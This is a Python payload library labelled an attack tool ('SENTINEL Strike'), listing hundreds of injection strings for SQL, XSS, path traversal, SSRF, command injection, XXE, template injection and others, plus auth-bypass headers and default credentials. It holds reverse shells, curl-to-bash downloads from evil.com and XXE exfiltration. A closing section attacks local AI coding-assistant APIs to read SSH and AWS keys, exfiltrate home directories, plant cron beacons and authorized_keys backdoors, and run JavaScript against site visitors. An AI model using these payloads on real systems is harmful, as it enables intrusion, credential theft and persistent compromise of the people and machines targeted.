#!/usr/bin/env python3
"""
SENTINEL Strike v3.0 — Extended Attack Payload Library

Comprehensive collection of attack payloads for:
- SQL Injection (100+ payloads)
- XSS (80+ payloads)
- LFI/Path Traversal (50+ payloads)
- SSRF (40+ payloads)
- Command Injection (50+ payloads)
- XXE (30+ payloads)
- SSTI (40+ payloads)
- Authentication Bypass (50+ payloads)
- Header Injection (30+ payloads)
- NoSQL Injection (30+ payloads)
- LDAP Injection (20+ payloads)
- CRLF Injection (20+ payloads)

Total: 500+ attack vectors
"""

from dataclasses import dataclass
from typing import List, Dict
from enum import Enum


class PayloadCategory(Enum):
    SQLI = "sqli"
    XSS = "xss"
    LFI = "lfi"
    SSRF = "ssrf"
    CMDI = "cmdi"
    XXE = "xxe"
    SSTI = "ssti"
    AUTH = "auth"
    HEADER = "header"
    NOSQL = "nosql"
    LDAP = "ldap"
    CRLF = "crlf"


@dataclass
class Payload:
    """Single attack payload."""
    id: str
    category: PayloadCategory
    name: str
    payload: str
    description: str = ""
    severity: str = "high"


# ============================================================================
# SQL INJECTION PAYLOADS (100+)
# ============================================================================

SQLI_PAYLOADS = [
    # Basic OR-based
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\" --",
    "1' OR '1'='1",
    "1 OR 1=1",
    "1' OR 1=1--",
    "1' OR 1=1#",
    "1' OR 1=1/*",
    "') OR ('1'='1",
    "')) OR (('1'='1",

    # AND-based
    "' AND '1'='1",
    "' AND 1=1--",
    "1' AND '1'='1",
    "1 AND 1=1",
    "1' AND 1=1--",

    # UNION-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT 1,@@version--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT 1,2,3,4--",
    "1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables--",

    # Error-based
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND 1=1 AND '1'='1",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",

    # Time-based blind
    "' AND SLEEP(5)--",
    "' AND SLEEP(5)#",
    "'; WAITFOR DELAY '0:0:5'--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' AND BENCHMARK(5000000,SHA1('test'))--",
    "1; WAITFOR DELAY '0:0:5';--",
    "1'; WAITFOR DELAY '0:0:5';--",
    "1) AND SLEEP(5)--",

    # Boolean-based blind
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND SUBSTRING(@@version,1,1)='5'--",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
    "1' AND (SELECT COUNT(*) FROM users)>0--",

    # Stacked queries
    "'; DROP TABLE users--",
    "'; DELETE FROM users--",
    "'; INSERT INTO users VALUES('hacker','hacked')--",
    "'; UPDATE users SET password='hacked'--",
    "'; EXEC xp_cmdshell('whoami')--",
    "'; EXEC sp_configure 'show advanced options',1--",

    # Authentication bypass
    "admin'--",
    "admin'#",
    "admin'/*",
    "admin' OR '1'='1",
    "admin' OR '1'='1'--",
    "admin' OR '1'='1'#",
    "admin') OR ('1'='1",
    "admin') OR ('1'='1'--",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "') OR ('a'='a",
    "' OR 'x'='x",
    "' OR ''='",

    # MySQL specific
    "1' AND @@version LIKE '5%'--",
    "1' AND database() LIKE '%'--",
    "' UNION SELECT NULL,@@version#",
    "' AND MID(@@version,1,1)='5'#",

    # PostgreSQL specific
    "' AND version()::text LIKE '%PostgreSQL%'--",
    "'; SELECT pg_sleep(5)--",
    "' UNION SELECT NULL,version()--",
    "' AND 1=cast((SELECT version()) as int)--",

    # MSSQL specific
    "' AND @@SERVERNAME='test'--",
    "'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--",
    "' UNION SELECT NULL,@@version--",
    "'; EXEC sp_executesql N'SELECT 1'--",

    # Oracle specific
    "' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1))--",
    "' UNION SELECT NULL,banner FROM v$version--",
    "' AND (SELECT COUNT(*) FROM all_tables)>0--",

    # SQLite specific
    "' AND sqlite_version() LIKE '%3%'--",
    "' UNION SELECT NULL,sqlite_version()--",

    # NoSQL injection (MongoDB-style in SQL context)
    "'; return this.password; var dummy='",

    # Advanced bypass techniques
    "/*!50000 OR*/ 1=1--",
    "+OR+1=1--",
    "%27%20OR%20%271%27%3D%271",
    "' oR '1'='1",
    "' Or '1'='1",
    "' OR '1'='1' --",
    "'||'1'='1",
    "' OR 1 --",
]

# ============================================================================
# XSS PAYLOADS (80+)
# ============================================================================

XSS_PAYLOADS = [
    # Basic - using console.log instead of alert to avoid popups
    '<script>console.log("STRIKE_XSS")</script>',
    '<script>console.log(1)</script>',
    '<script>console.log(document.cookie)</script>',
    '<script>console.log(document.domain)</script>',
    "<script src='http://evil.com/xss.js'></script>",

    # Event handlers
    '<img src=x onerror=console.log("XSS")>',
    "<img src=x onerror='console.log(1)'>",
    '<img/src=x onerror=console.log(1)>',
    '<svg onload=console.log("XSS")>',
    '<svg/onload=console.log(1)>',
    '<body onload=console.log("XSS")>',
    '<body onpageshow=console.log(1)>',
    '<input onfocus=console.log("XSS") autofocus>',
    '<input onblur=console.log(1) autofocus><input autofocus>',
    '<marquee onstart=console.log("XSS")>',
    '<video src=x onerror=console.log(1)>',
    '<audio src=x onerror=console.log(1)>',
    '<details open ontoggle=console.log(1)>',
    "<object data='javascript:console.log(1)'>",
    "<embed src='javascript:console.log(1)'>",
    "<iframe src='javascript:console.log(1)'>",
    "<iframe srcdoc='<script>console.log(1)</script>'>",

    # Attribute injection
    "' onclick=console.log(1)//",
    '" onfocus=console.log(1) autofocus="',
    "' onmouseover=console.log(1)//",
    'javascript:console.log("XSS")',
    'javascript:console.log(1)',
    'JaVaScRiPt:console.log(1)',

    # Breaking out of attributes
    "'><script>console.log(1)</script>",
    '"><script>console.log(1)</script>',
    '</title><script>console.log(1)</script>',
    '</script><script>console.log(1)</script>',
    '</style><script>console.log(1)</script>',

    # Encoding bypass
    '<script>console.log(String.fromCharCode(88,83,83))</script>',
    '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
    '<svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>',
    "<script>eval(atob('Y29uc29sZS5sb2coMSk='))</script>",

    # Template injection (Angular, Vue, etc.)
    "{{constructor.constructor('console.log(1)')()}}",
    "{{$on.constructor('console.log(1)')()}}",
    '${console.log(1)}',
    '<%= console.log(1) %>',
    '#{console.log(1)}',
    '{{7*7}}',
    '${7*7}',

    # DOM-based
    '<img src=x onerror=eval(location.hash.substr(1))>',
    '<script>eval(location.search.substr(1))</script>',

    # Mutation XSS
    "<noscript><p title='</noscript><script>console.log(1)</script>'>",
    "<a href='javascript&colon;console.log(1)'>click</a>",

    # SVG specific
    '<svg><script>console.log(1)</script></svg>',
    '<svg><animate onbegin=console.log(1)>',
    '<svg><set onbegin=console.log(1)>',

    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=console.log(1) )//",
    '\'\"-->]]>*/</script></style></title></textarea></noscript><script>console.log(1)</script>',

    # Filter bypass
    '<ScRiPt>console.log(1)</ScRiPt>',
    '<scr<script>ipt>console.log(1)</scr</script>ipt>',
    '<script >console.log(1)</script >',
    '<script\t>console.log(1)</script>',
    '<script\n>console.log(1)</script>',
    '<script\r>console.log(1)</script>',
    '<SCRIPT>console.log(1)</SCRIPT>',

    # Data URI
    "<a href='data:text/html,<script>console.log(1)</script>'>click</a>",
    "<object data='data:text/html,<script>console.log(1)</script>'>",

    # Additional vectors
    "<math><maction actiontype='statusline#http://evil.com' xlink:href='javascript:console.log(1)'>click",
    "<isindex action='javascript:console.log(1)' type=image>",
    "<form action='javascript:console.log(1)'><input type=submit>",
    "<base href='javascript:console.log(1)//'>",
    "<link rel='import' href='data:text/html,<script>console.log(1)</script>'>",
]

# ============================================================================
# LFI / PATH TRAVERSAL PAYLOADS (50+)
# ============================================================================

LFI_PAYLOADS = [
    # Basic traversal
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",

    # Windows
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....\\....\\....\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",

    # Encoded variants
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",

    # Null byte (legacy)
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.jpg",
    "../../../etc/passwd\x00",

    # Wrapper protocols
    "file:///etc/passwd",
    "file://localhost/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://input",
    "php://data",
    "expect://id",
    "zip://file.zip#shell.php",
    "phar://file.phar/shell.php",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",

    # Interesting files (Linux)
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/etc/issue",
    "/etc/motd",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/fd/0",
    "/proc/version",
    "/proc/net/tcp",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
    "/root/.bash_history",
    "/root/.ssh/id_rsa",
    "/home/*/.ssh/id_rsa",

    # Interesting files (Windows)
    "C:\\Windows\\win.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\boot.ini",
    "C:\\inetpub\\wwwroot\\web.config",

    # Application specific
    "../../../var/www/html/config.php",
    "../../../app/config/database.yml",
    "../../../config/database.yml",
    "../../../.env",
    "../../../wp-config.php",
]

# ============================================================================
# SSRF PAYLOADS (40+)
# ============================================================================

SSRF_PAYLOADS = [
    # Localhost variants
    "http://localhost",
    "http://localhost:80",
    "http://localhost:443",
    "http://localhost:8080",
    "http://127.0.0.1",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:8080",
    "http://[::1]",
    "http://[0:0:0:0:0:0:0:1]",
    "http://0.0.0.0",
    "http://0",
    "http://127.1",
    "http://127.0.1",

    # Cloud metadata endpoints
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://100.100.100.200/latest/meta-data/",  # Alibaba
    "http://169.254.170.2/v1/credentials",  # Azure

    # Internal network scanning
    "http://192.168.1.1",
    "http://192.168.0.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
    "http://intranet",
    "http://internal",

    # Protocol handlers
    "file:///etc/passwd",
    "file://localhost/etc/passwd",
    "dict://localhost:11211/stats",
    "gopher://localhost:6379/_INFO",
    "gopher://localhost:11211/_stats",
    "ldap://localhost:389",
    "tftp://evil.com/shell.sh",

    # Bypass techniques
    "http://127.0.0.1.xip.io",
    "http://www.127.0.0.1.xip.io",
    "http://127。0。0。1",  # Fullwidth dots
    "http://①②⑦.0.0.1",  # Unicode numbers
    "http://0x7f000001",  # Hex
    "http://2130706433",  # Decimal
    "http://0177.0.0.1",  # Octal

    # DNS rebinding
    "http://rebind.network:53/",
]

# ============================================================================
# COMMAND INJECTION PAYLOADS (50+)
# ============================================================================

CMDI_PAYLOADS = [
    # Basic
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",

    # With newlines
    "%0aid",
    "%0a id",
    "\nid",
    "\n id",
    "%0d%0aid",

    # Chained
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "& cat /etc/passwd",
    "&& cat /etc/passwd",
    "`cat /etc/passwd`",
    "$(cat /etc/passwd)",

    # Windows
    "& dir",
    "| dir",
    "&& dir",
    "& type C:\\Windows\\win.ini",
    "| type C:\\Windows\\win.ini",

    # Time-based
    "; sleep 5",
    "| sleep 5",
    "& ping -c 5 127.0.0.1",
    "; ping -n 5 127.0.0.1",
    "$(sleep 5)",
    "`sleep 5`",

    # Reverse shell templates
    "; bash -i >& /dev/tcp/ATTACKER/PORT 0>&1",
    "| nc -e /bin/sh ATTACKER PORT",
    "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",

    # Bypass filters
    ";$IFS'id'",
    ";{id}",
    ";id\t",
    "a]|[id",
    ";i]d",
    "$(echo${IFS}id)",
    ";`echo${IFS}id`",
    ";/???/??t${IFS}/???/p]a]s]s]w]d",

    # Write files
    "; echo 'test' > /tmp/pwned",
    "| echo 'test' > /tmp/pwned",

    # Download and execute
    "; curl http://evil.com/shell.sh | bash",
    "| wget -O- http://evil.com/shell.sh | bash",
]

# ============================================================================
# XXE PAYLOADS (30+)
# ============================================================================

XXE_PAYLOADS = [
    # Basic file read
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',

    # Windows
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',

    # SSRF via XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080">]><foo>&xxe;</foo>',

    # Parameter entities
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>',

    # OOB (Out of Band)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;%send;]>',

    # Error-based
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]><foo>&xxe;</foo>',

    # XInclude
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',

    # SVG XXE
    '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="expect://id"></image></svg>',

    # Excel/Office
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><worksheet><data>&xxe;</data></worksheet>',
]

# ============================================================================
# SSTI PAYLOADS (40+)
# ============================================================================

SSTI_PAYLOADS = [
    # Detection
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "${{7*7}}",
    "#{7*7}",
    "*{7*7}",
    "@(7*7)",
    "{{7*'7'}}",

    # Jinja2 / Flask
    "{{config}}",
    "{{config.items()}}",
    "{{self.__init__.__globals__}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",

    # Twig (PHP)
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    "{{['id']|filter('system')}}",

    # Smarty (PHP)
    "{php}echo `id`;{/php}",
    "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php system('id');?>\",self::clearConfig())}",

    # Freemarker (Java)
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",

    # Velocity (Java)
    "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",

    # Pebble (Java)
    "{% set cmd = 'id' %}{{ cmd.getClass().forName('java.lang.Runtime').getMethod('exec',cmd.getClass()).invoke(cmd.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),cmd) }}",

    # Thymeleaf (Java)
    "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",

    # Mako (Python)
    "${self.module.cache.util.os.popen('id').read()}",
    "<%import os%>${os.popen('id').read()}",

    # ERB (Ruby)
    "<%= system('id') %>",
    "<%= `id` %>",
    "<%= IO.popen('id').readlines() %>",

    # Handlebars
    "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
]

# ============================================================================
# NOSQL INJECTION PAYLOADS (30+)
# ============================================================================

NOSQL_PAYLOADS = [
    # MongoDB
    '{"$gt":""}',
    '{"$ne":""}',
    '{"$regex":".*"}',
    '{"$where":"1==1"}',
    '{"$or":[{},{"foo":"bar"}]}',
    '{"$and":[{},{"foo":"bar"}]}',

    # Authentication bypass
    '{"username":{"$gt":""},"password":{"$gt":""}}',
    '{"username":"admin","password":{"$ne":""}}',
    '{"username":"admin","password":{"$gt":""}}',
    '{"username":{"$regex":"^admin"},"password":{"$gt":""}}',

    # Extraction
    '{"$where":"this.password.match(/^a/)"}',
    '{"$where":"this.password[0]==\'a\'"}',

    # JavaScript injection
    '{"$where":"function(){return true}"}',
    '{"$where":"function(){sleep(5000)}"}',

    # Array manipulation
    '{"$push":{"admin":true}}',
    '{"$set":{"isAdmin":true}}',

    # URL form
    "username[$ne]=&password[$ne]=",
    "username[$gt]=&password[$gt]=",
    "username=admin'||'1'=='1",
    'username[$regex]=.*&password[$regex]=.*',
]

# ============================================================================
# LDAP INJECTION PAYLOADS (20+)
# ============================================================================

LDAP_PAYLOADS = [
    # Authentication bypass
    "*",
    "*)(&",
    "*)(uid=*))(|(uid=*",
    "admin)(&)",
    "admin)(|(password=*))",
    "x])(|(uid=admin",
    "admin)(!(&(1=0",

    # Extraction
    "*)(uid=*)",
    "*)(objectClass=*)",
    "*()|%26'",
    "*)|(!(&(",

    # Boolean-based
    "admin)(|(objectClass=*))",
    "admin)(&(objectClass=user)(",

    # Blind injection
    "*)(uid=admin)(|(uid=*",
    "admin)(&(uid=admin))",
]

# ============================================================================
# CRLF INJECTION PAYLOADS (20+)
# ============================================================================

CRLF_PAYLOADS = [
    # Basic
    "%0d%0aHeader-Injection: true",
    "%0aHeader-Injection: true",
    "%0dHeader-Injection: true",
    "\r\nHeader-Injection: true",
    "\nHeader-Injection: true",

    # XSS via CRLF
    '%0d%0a%0d%0a<script>console.log(1)</script>',
    '\\r\\n\\r\\n<html><script>console.log(1)</script></html>',

    # Session fixation
    "%0d%0aSet-Cookie:%20session=hacked",
    "\r\nSet-Cookie: session=hacked",

    # Cache poisoning
    "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>Poisoned</html>",

    # Encoded variants
    "%E5%98%8A%E5%98%8DHeader-Injection: true",  # UTF-8
    "%c0%0d%c0%0aHeader-Injection: true",

    # HTTP Response Splitting
    " HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>injected</html>",
]

# ============================================================================
# AUTH BYPASS HEADERS (30+)
# ============================================================================

AUTH_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Forwarded-For": "192.168.1.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Host": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Override-URL": "/admin"},
    {"Referer": "http://127.0.0.1/admin"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"Host": "localhost"},
    {"X-Forwarded-Port": "443"},
    {"X-Forwarded-Scheme": "https"},
    {"X-URL": "/admin"},
    {"X-HTTP-Method-Override": "PUT"},
    {"X-Method-Override": "PUT"},
    {"X-Requested-With": "XMLHttpRequest"},
    {"Content-Type": "application/json"},
    {"Authorization": "Bearer null"},
    {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
    {"Cookie": "admin=true"},
    {"Cookie": "isAdmin=1"},
    {"Cookie": "role=admin"},
    {"X-Debug": "true"},
]

# ============================================================================
# CREDENTIALS FOR BRUTEFORCE (50+)
# ============================================================================

COMMON_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "Admin123"),
    ("admin", "admin@123"),
    ("admin", "Password1"),
    ("admin", "qwerty"),
    ("admin", "12345678"),
    ("admin", "letmein"),
    ("admin", "welcome"),
    ("admin", "monkey"),
    ("admin", "dragon"),
    ("admin", "master"),
    ("admin", ""),
    ("root", "root"),
    ("root", "toor"),
    ("root", "password"),
    ("root", "123456"),
    ("root", ""),
    ("administrator", "administrator"),
    ("administrator", "password"),
    ("administrator", "admin"),
    ("user", "user"),
    ("user", "password"),
    ("test", "test"),
    ("test", "password"),
    ("guest", "guest"),
    ("guest", "password"),
    ("demo", "demo"),
    ("oracle", "oracle"),
    ("postgres", "postgres"),
    ("mysql", "mysql"),
    ("ftpuser", "ftpuser"),
    ("anonymous", "anonymous"),
    ("", ""),
    ("admin", "1234"),
    ("admin", "pass"),
    ("admin", "test"),
    ("admin", "changeme"),
    ("sa", ""),
    ("sa", "sa"),
    ("tomcat", "tomcat"),
    ("manager", "manager"),
    ("cisco", "cisco"),
    ("ubnt", "ubnt"),
    ("pi", "raspberry"),
    ("vagrant", "vagrant"),
    ("ansible", "ansible"),
]


# ============================================================================
# AGGREGATE ALL PAYLOADS
# ============================================================================

def get_all_payloads() -> Dict[str, List[str]]:
    """Get all payloads organized by category."""
    return {
        "sqli": SQLI_PAYLOADS,
        "xss": XSS_PAYLOADS,
        "lfi": LFI_PAYLOADS,
        "ssrf": SSRF_PAYLOADS,
        "cmdi": CMDI_PAYLOADS,
        "xxe": XXE_PAYLOADS,
        "ssti": SSTI_PAYLOADS,
        "nosql": NOSQL_PAYLOADS,
        "ldap": LDAP_PAYLOADS,
        "crlf": CRLF_PAYLOADS,
        "ai_coding_rce": AI_CODING_ASSISTANT_RCE_PAYLOADS,
    }


def get_payload_counts() -> Dict[str, int]:
    """Get payload counts by category."""
    payloads = get_all_payloads()
    counts = {cat: len(plds) for cat, plds in payloads.items()}
    counts["auth_headers"] = len(AUTH_BYPASS_HEADERS)
    counts["credentials"] = len(COMMON_CREDENTIALS)
    counts["total"] = sum(counts.values())
    return counts


# ============================================================================
# AI CODING ASSISTANT RCE PAYLOADS (CVE-2026-22812 and similar)
# ============================================================================

AI_CODING_ASSISTANT_RCE_PAYLOADS = [
    # CVE-2026-22812 - OpenCode (pre-v1.0.216)
    # Unauthenticated RCE via local HTTP API
    
    # Create session and execute command
    '{"agent":"build","command":"id"}',
    '{"agent":"build","command":"whoami"}',
    '{"agent":"build","command":"cat /etc/passwd"}',
    '{"agent":"build","command":"curl http://evil.com/shell.sh|bash"}',
    '{"agent":"build","command":"wget -O- http://evil.com/shell.sh|bash"}',
    
    # Windows variants
    '{"agent":"build","command":"dir C:\\\\"}',
    '{"agent":"build","command":"type C:\\\\Windows\\\\win.ini"}',
    '{"agent":"build","command":"powershell -c \\"IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/ps.ps1\')\\"}',
    
    # Reverse shell payloads
    '{"agent":"build","command":"bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"}',
    '{"agent":"build","command":"python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect((\\"ATTACKER\\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\"/bin/sh\\",\\"-i\\"])\'"}',
    
    # File operations
    '{"command":"read","path":"/etc/passwd"}',
    '{"command":"read","path":"C:\\\\Windows\\\\win.ini"}',
    '{"command":"read","path":"~/.ssh/id_rsa"}',
    '{"command":"read","path":"~/.aws/credentials"}',
    '{"command":"read","path":".env"}',
    
    # PTY endpoints (interactive shell)
    '{"cols":80,"rows":24,"command":"/bin/bash"}',
    '{"cols":80,"rows":24,"command":"cmd.exe"}',
    '{"cols":80,"rows":24,"command":"powershell.exe"}',
    
    # Browser-based exploitation (pre-CORS fix)
    # These are JavaScript payloads that exploit visitors
    "fetch('http://127.0.0.1:4096/session',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'}).then(r=>r.json()).then(s=>{fetch(`http://127.0.0.1:4096/session/${s.id}/shell`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent:'build',command:'id > /tmp/pwned'})})})",
    
    # Port scanning for coding assistants
    # Common ports: 4096 (OpenCode), 3000 (Cursor), 8080 (generic)
    '{"target_ports":[4096,3000,3001,8080,8081,5000]}',
    
    # Data exfiltration
    '{"agent":"build","command":"tar czf - /home | base64 | curl -X POST -d @- http://evil.com/exfil"}',
    '{"agent":"build","command":"zip -r - . | curl -X POST --data-binary @- http://evil.com/exfil"}',
    
    # Persistence
    '{"agent":"build","command":"echo \'* * * * * curl http://evil.com/beacon\' | crontab -"}',
    '{"agent":"build","command":"echo \'ssh-rsa AAAA... attacker@evil\' >> ~/.ssh/authorized_keys"}',
]

# Default ports for AI coding assistants
AI_CODING_ASSISTANT_PORTS = {
    "opencode": [4096, 4097, 4098, 4099],
    "cursor": [3000, 3001],
    "github_copilot": [8080],
    "codeium": [3300],
    "tabnine": [9000],
    "continue": [65432],
}


# ============================================================================
# PRINT STATS
# ============================================================================

if __name__ == "__main__":
    counts = get_payload_counts()

    print("=" * 50)
    print("🎯 SENTINEL Strike — Attack Payload Library")
    print("=" * 50)

    print("\n📊 Payload Counts:")
    for cat, count in counts.items():
        if cat != "total":
            print(f"   • {cat.upper():15} {count:4} payloads")

    print(f"\n   {'─' * 30}")
    print(f"   {'TOTAL':15} {counts['total']:4} payloads")
    print("=" * 50)
